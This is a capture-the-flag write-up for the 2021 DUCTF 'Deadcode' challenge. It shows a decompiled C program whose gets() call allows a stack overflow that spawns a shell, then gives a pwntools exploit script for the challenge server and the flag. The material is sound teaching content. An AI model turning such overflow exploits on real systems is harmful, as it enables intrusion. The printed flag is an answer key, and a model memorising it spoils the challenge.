# Deadcode
>I'm developing this new application in C, I've setup some code for the new features but it's not (a)live yet.


>Author: xXl33t_h@x0rXx

>nc pwn-2021.duc.tf 31916

[Deadcode](https://drive.google.com/file/d/1yZbYUURFfaBssl4LK7UaCUftya2-NQCy/view?usp=sharing)

## Solution 
 Use IDA pro 
```int __cdecl main(int argc, const char **argv, const char **envp)
{
  char v4; // [rsp+0h] [rbp-20h]
  __int64 v5; // [rsp+18h] [rbp-8h]

  v5 = 0LL;
  buffer_init(*(_QWORD *)&argc, argv, envp);
  puts("\nI'm developing this new application in C, I've setup some code for the new features but it's not (a)live yet.");
  puts("\nWhat features would you like to see in my app?");
  gets(&v4);
  if ( v5 == 0xDEADC0DELL )
  {
    puts("\n\nMaybe this code isn't so dead...");
    system("/bin/sh");
  }
  return 0;
}
```
This is the simple buffer overflow

Function `gets` that we can use to write past buffer size.

The v4 variable is located at `rbp-0x20`, the v5 variable is located at `rbp-0x8`, so the distance is `0x18`.

So I wrote sript to get flag

```
from pwn import *

p = remote('pwn-2021.duc.tf',31916)


buff = "A"*24

payload = buff
payload += p64(0xdeadc0de)

p.sendline(payload)
p.interactive()
```

> Flag: `DUCTF{y0u_br0ught_m3_b4ck_t0_l1f3_mn423kcv}`
